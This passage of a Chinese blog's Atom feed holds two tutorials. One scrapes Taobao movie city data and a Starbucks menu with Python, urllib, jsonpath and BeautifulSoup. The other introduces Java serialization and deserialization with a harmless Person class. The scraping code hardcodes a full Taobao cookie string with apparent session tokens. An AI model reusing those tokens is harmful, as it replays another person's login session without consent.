class="string">&#x27;https://dianying.taobao.com/cityAction.json?activityId&amp;_ksTS=1660476866218_108&amp;jsoncallback=jsonp109&amp;action=cityAction&amp;n_s=new&amp;event_submit_doGetAllRegion=true&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="comment"># &#x27;:authority&#x27;: &#x27;dianying.taobao.com&#x27;,</span></span><br><span class="line">    <span class="comment"># &#x27;:method&#x27;: &#x27;GET&#x27;,</span></span><br><span class="line">    <span class="comment"># &#x27;:path&#x27;: &#x27;/cityAction.json?activityId&amp;_ksTS=1660476866218_108&amp;jsoncallback=jsonp109&amp;action=cityAction&amp;n_s=new&amp;event_submit_doGetAllRegion=true&#x27;,</span></span><br><span class="line">    <span class="comment"># &#x27;:scheme&#x27;: &#x27;https&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;accept&#x27;</span>: <span class="string">&#x27;text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01&#x27;</span>,</span><br><span class="line">    <span class="comment"># &#x27;accept-encoding&#x27;: &#x27;gzip, deflate, br&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;accept-language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;bx-v&#x27;</span>: <span class="string">&#x27;2.2.2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cookie&#x27;</span>: <span class="string">&#x27;cna=/2aWGsWi/loCAXAx9pQ8UTSC; miid=684269234985765900; enc=9HDdNFs5gyOQuzdApfEJPk50Cwf%2FlLh9K%2Fiabx9RI%2BBmo2QtS59XpwW8aETF8t%2B%2B6MYMx88YU%2BS8L4go%2BGzwGGiL83ltVyw%2BBnInqwnsUeKKaZ8gFHx9AjTGjM%2BRdo7e; thw=cn; _m_h5_tk=ec3acd5ea85c2c22f19dfdd9c5e72e6a_1660287437842; _m_h5_tk_enc=a68b03acb80f902b4d2403082acdfcac; t=fc3a35a1949a5061d43a8ad7a0aa32e6; cookie2=1b381909a7657c7e522221e067a1186f; v=0; _tb_token_=e7e0101153be8; xlly_s=1; l=eBxmMRGgLLqMpU8MBOfanurza77O8IRYmuPzaNbMiOCPO55H5AxcW6YtVWYMCnGVh6PeR3k0hW66BeYBqC2sjqj2nAHOr3Dmn; tfstk=croRBJ_31IAugGz_RYL08pVLpjvGZF68tTNdvD7Lz7senRsdiAniXYuwPJPawKC..; isg=BLa23tHByPmhSbxqKPOUAR5xB-y41_oRIlkEAyCf8hk0Y1b9iGaOIVUdez8PT_Ip&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;referer&#x27;</span>: <span class="string">&#x27;https://dianying.taobao.com/index.htm?n_s=new&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua&#x27;</span>: <span class="string">&#x27;&quot;Chromium&quot;;v=&quot;104&quot;, &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Microsoft Edge&quot;;v=&quot;104&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua-mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua-platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-fetch-dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-fetch-mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-fetch-site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36 Edg/104.0.1293.54&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;x-requested-with&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">request = urllib.request.Request(url = url,headers = headers)</span><br><span class="line"></span><br><span class="line">response = urllib.request.urlopen(request)</span><br><span class="line"></span><br><span class="line">content = response.read().decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">content = content.split(<span class="string">&#x27;(&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;)&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;taopp.json&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf8&#x27;</span>)<span class="keyword">as</span> fp:</span><br><span class="line">    fp.write(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> jsonpath</span><br><span class="line"></span><br><span class="line">obj = json.load(<span class="built_in">open</span>(<span class="string">&#x27;taopp.json&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">city_list = jsonpath.jsonpath(obj,<span class="string">&#x27;$..regionName&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(city_list)</span><br></pre></td></tr></table></figure><br><h4 id="三、bs4"><a href="#三、bs4" class="headerlink" title="三、bs4"></a>三、bs4</h4><h5 id="1、bs4-基本使用"><a href="#1、bs4-基本使用" class="headerlink" title="1、bs4 基本使用"></a>1、bs4 基本使用</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;b1&quot;</span> <span class="attr">title</span>=<span class="string">&quot;a1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;l1&quot;</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>李四<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>王五<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>赵六<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>钱七<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>哈哈哈<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span>&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(<span class="built_in">open</span>(<span class="string">&#x27;06_解析_bs4之基本使用.html&#x27;</span>,encoding=<span class="string">&#x27;utf8&#x27;</span>),<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(soup)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bs4 的一些函数</span></span><br><span class="line"><span class="comment"># (1)find</span></span><br><span class="line"><span class="comment"># 返回的是第一个符合条件的数据</span></span><br><span class="line"><span class="comment"># print(soup.find(&#x27;div&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据标签的值来找对应的标签对象</span></span><br><span class="line"><span class="comment"># print(soup.find(&#x27;li&#x27;,title=&#x27;a1&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据class标签来找到对应的标签对象</span></span><br><span class="line"><span class="comment"># class 不能直接用,要用 class_</span></span><br><span class="line"><span class="comment"># print(soup.find(&#x27;li&#x27;,class_=&#x27;l1&#x27;))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># (2)find_all</span></span><br><span class="line"><span class="comment"># 找到所有标签的数据 返回的值是列表类型</span></span><br><span class="line"><span class="comment"># print(soup.find_all(&#x27;li&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 多个标签查询要加中括号[]</span></span><br><span class="line"><span class="comment"># print(soup.find_all([&#x27;li&#x27;,&#x27;span&#x27;]))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># limit 的作用是查找前几个</span></span><br><span class="line"><span class="comment"># print(soup.find_all(&#x27;li&#x27;,limit=2))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># (3)select</span></span><br><span class="line"><span class="comment"># 返回多个数据 返回的是列表类型</span></span><br><span class="line"><span class="comment"># print(soup.select(&#x27;li&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以通过 . 表示class 这种操作称为类选择器</span></span><br><span class="line"><span class="comment"># print(soup.select(&#x27;.l1&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以通过 # 代表id</span></span><br><span class="line"><span class="comment"># print(soup.select(&#x27;#b1&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 属性选择器</span></span><br><span class="line"><span class="comment"># 查找li标签中含有id的标签</span></span><br><span class="line"><span class="comment"># print(soup.select(&#x27;li[id]&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找指定id标签</span></span><br><span class="line"><span class="comment"># print(soup.select(&#x27;li[id=&quot;b1&quot;]&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 层级选择器</span></span><br><span class="line"><span class="comment"># 后代选择器</span></span><br><span class="line"><span class="comment"># print(soup.select(&#x27;div li&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 子代选择器</span></span><br><span class="line"><span class="comment"># print(soup.select(&#x27;div &gt; ul &gt;li&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询多个标签数据</span></span><br><span class="line"><span class="comment"># print(soup.select(&#x27;li,span&#x27;))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 节点信息</span></span><br><span class="line"><span class="comment"># obj = soup.select(&#x27;#b1&#x27;)[0]</span></span><br><span class="line"><span class="comment"># print(obj.string)</span></span><br><span class="line"><span class="comment"># print(obj.get_text())</span></span><br><span class="line"><span class="comment"># 如果标签对象中 只有内容 那么string和get_text()都可以使用</span></span><br><span class="line"><span class="comment"># 如果标签对象中 除了内容还有标签 那么string就获取不到数据 而get_text()是可以获取数据的</span></span><br><span class="line"><span class="comment"># 一般情况下 推荐使用get_text()</span></span><br><span class="line"><span class="comment"># obj = soup.select(&#x27;div&#x27;)[0]</span></span><br><span class="line"><span class="comment"># print(obj.string)</span></span><br><span class="line"><span class="comment"># print(obj.get_text())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 节点的属性</span></span><br><span class="line"><span class="comment"># name是标签的名字</span></span><br><span class="line"><span class="comment"># obj = soup.select(&#x27;#b1&#x27;)[0]</span></span><br><span class="line"><span class="comment"># print(obj.name)</span></span><br><span class="line"><span class="comment"># 将属性值作为一个字典返回</span></span><br><span class="line"><span class="comment"># print(obj.attrs)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取节点的属性</span></span><br><span class="line"><span class="comment"># print(obj.attrs.get(&#x27;class&#x27;))</span></span><br></pre></td></tr></table></figure><h5 id="2、bs4-星巴克菜单"><a href="#2、bs4-星巴克菜单" class="headerlink" title="2、bs4 星巴克菜单"></a>2、bs4 星巴克菜单</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://www.starbucks.com.cn/menu/&#x27;</span></span><br><span class="line"></span><br><span class="line">response = urllib.request.urlopen(url)</span><br><span class="line"></span><br><span class="line">content = response.read().decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(content,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># //ul[@class=&quot;grid padded-3 product&quot;]//strong</span></span><br><span class="line">name_list = soup.select(<span class="string">&#x27;ul[class=&quot;grid padded-3 product&quot;] strong&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> name_list:</span><br><span class="line">    <span class="built_in">print</span>(name.get_text())</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;解析&lt;/p&gt;</summary>
    
    
    
    <category term="Python" scheme="http://blog.hvvl404.fun/categories/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>Java反序列化</title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2023-05-12T12:29:54.596Z</published>
    <updated>2023-05-25T15:00:46.945Z</updated>
    
    <content type="html"><![CDATA[<p>Java反序列化</p><span id="more"></span><p>什么是 Java 反序列化？</p><p>Java 反序列化同样也是将对象转换为字符串，但是跟 PHP 反序列化不一样，它涉及到的一些机制、类、接口等比较多，利用的也多，所以 Java 反序列化可能会稍微难点，但是天下没有难办的事。只要好好学都能学好，博客也都是我边学边写的，如有错误，还请斧正。</p><p>怎么实现？</p><p>（1）<strong>java.io.ObjectOutputStream</strong>：表示对象输出流</p><p>它的writeObject(Object obj)方法可以对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。</p><p>（2）<strong>java.io.ObjectInputStream</strong>：表示对象输入流</p><p>它的readObject()方法从源输入流中读取字节序列，再把它们反序列化成为一个对象，并将其返回。</p><p>举例明了一点：</p><p>1、先创建一个 Person 类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Serialize接口，但是Serialize不提供任何方法，是一个空接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、序列化（SerializationTest.java）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="comment">// 创建一个对象输出流，它可以包装一个其它类型的目标输出流，如文件输出流：</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        <span class="comment">// 将序列化后的字符串写入 ser.bin 文件里</span></span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 初始化</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;aa&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        serialize(person);</span><br><span class="line">        <span class="comment">// System.out.println(person);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：<code>Person&#123;name=&#39;aa&#39;, age=22&#125;</code></p><p>3、反序列化（UnserializationTest.java）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="comment">// 创建一个对象输入流，它可以包装一个其它类型输入流，如文件输入流：</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="comment">// 读取文件 ser.bin</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 从ser.bin读取</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person) unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：<code>Person&#123;name=&#39;aa&#39;, age=22&#125;</code></p><p>上述代码就可以实现了徐序列化和反序列化。</p><p>Person.java 是我们要序列化的类， SerializationTest.java 是实现序列化的类，以下代码是该类需要实现的功能（方法），然后调用输出：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="comment">// 创建一个对象输出流，它可以包装一个其它类型的目标输出流，如文件输出流：</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        <span class="comment">// 将序列化后的字符串写入 ser.bin 文件里</span></span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>UnserializationTest.java 是实现反序列化的类，原理同样一样，主要代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="comment">// 创建一个对象输入流，它可以包装一个其它类型输入流，如文件输入流：</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="comment">// 读取文件 ser.bin</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;Java反序列化&lt;/p&gt;</summary>
    
    
    
    <category term="Web漏洞" scheme="http://blog.hvvl404.fun/categories/Web%E6%BC%8F%E6%B4%9E/"/>
    
    
  </entry>
  
</feed>
